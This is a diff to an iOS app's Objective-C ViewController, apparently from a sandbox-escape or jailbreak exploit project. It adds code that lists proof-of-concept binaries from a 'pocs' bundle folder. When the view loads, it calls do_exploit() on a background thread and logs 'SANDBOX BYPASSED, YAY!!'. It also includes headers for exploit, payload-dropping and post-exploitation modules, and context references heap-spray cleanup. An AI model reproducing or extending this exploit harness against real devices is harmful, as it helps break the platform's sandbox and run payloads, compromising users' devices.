@@ -18,6 +18,19 @@
 #include "rwx.h"
 #include "post_exploit.h"
 
+
+
+#include "sandbox/log.h"
+#include "sandbox/sploit.h"
+#include "sandbox/drop_payload.h"
+
+#include <CoreFoundation/CoreFoundation.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <dirent.h>
+#include <string.h>
+
+
 #define KERNEL_MAGIC 							(0xfeedfacf)
 static
 void print_welcome_message() {
@@ -123,6 +136,46 @@ cleanup:
 
 
 
+static char* bundle_path() {
+    CFBundleRef mainBundle = CFBundleGetMainBundle();
+    CFURLRef resourcesURL = CFBundleCopyResourcesDirectoryURL(mainBundle);
+    int len = 4096;
+    char* path = malloc(len);
+    
+    CFURLGetFileSystemRepresentation(resourcesURL, TRUE, (UInt8*)path, len);
+    
+    return path;
+}
+
+NSArray* getBundlePocs() {
+    DIR *dp;
+    struct dirent *ep;
+    
+    char* in_path = NULL;
+    char* bundle_root = bundle_path();
+    asprintf(&in_path, "%s/pocs/", bundle_root);
+    
+    NSMutableArray* arr = [NSMutableArray array];
+    
+    dp = opendir(in_path);
+    if (dp == NULL) {
+        printf("unable to open pocs directory: %s\n", in_path);
+        return NULL;
+    }
+    
+    while ((ep = readdir(dp))) {
+        if (ep->d_type != DT_REG) {
+            continue;
+        }
+        char* entry = ep->d_name;
+        [arr addObject:[NSString stringWithCString:entry encoding:NSASCIIStringEncoding]];
+        
+    }
+    closedir(dp);
+    free(bundle_root);
+    
+    return arr;
+}
 
 
 @interface ViewController()
@@ -131,11 +184,39 @@ cleanup:
 
 @end
 
+id vc;
+NSArray* bundle_pocs;
+
 @implementation ViewController
 
 - (void)viewDidLoad{
-
+    
+    [super viewDidLoad];
+    vc = self;
+    
+    // get the list of poc binaries:
+    bundle_pocs = getBundlePocs();
+    
+      
+    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^(void){
+        do_exploit();
+        dispatch_async(dispatch_get_main_queue(), ^{
+            self.kys.enabled = true;
+            NSLog(@"SANDBOX BYPASSED, YAY!!");
+        });
+    });
+    
+    
 }
+
+- (void)logMsg:(NSString*)msg {
+    NSLog(@"%@", msg);
+    NSString* line = [msg stringByAppendingString:@"\n"];
+    dispatch_async(dispatch_get_main_queue(), ^{
+        NSLog(@"%@\n", line);
+    });
+}
+
 
 - (void)didReceiveMemoryWarning {
     [super didReceiveMemoryWarning];
@@ -144,6 +225,7 @@ cleanup:
 
 
 - (void)dealloc {
+    [_kys release];
     [super dealloc];
 }
 - (IBAction)kys:(id)sender {
@@ -217,3 +299,8 @@ cleanup:
     heap_spray_cleanup();
 }
 @end
+void logMsg(char* msg) {
+    NSString* str = [NSString stringWithCString:msg encoding:NSASCIIStringEncoding];
+    [vc logMsg:str];
+}
+
